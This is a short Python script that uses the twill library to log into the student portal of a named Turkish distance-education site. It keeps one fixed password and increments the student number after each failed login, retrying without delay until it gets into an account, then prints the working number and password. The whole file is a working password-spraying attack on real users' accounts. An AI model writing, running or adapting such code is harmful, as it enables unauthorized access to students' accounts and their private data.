from twill.commands import *
import time
go('https://besuzaktanegitim.com/')
kullaniciadi = 350302
sifre = "1784AEG"
def girisyap(kullaniciadix, sifre):
    fv("1", "giris_no", str(kullaniciadix))
    fv("1", "parola", sifre)
    submit('1')

    try:
        url(should_be="besuzaktanegitim.com/ogrenci-panel.ntr")
    except:
        kullaniciadix += 1
        print("Hata")
        #time.sleep(15)
        girisyap(kullaniciadix, sifre)
    else:
        print("Giris yapildi. Kullanici adi:", kullaniciadix, "sifre:", sifre)

girisyap(kullaniciadi, sifre)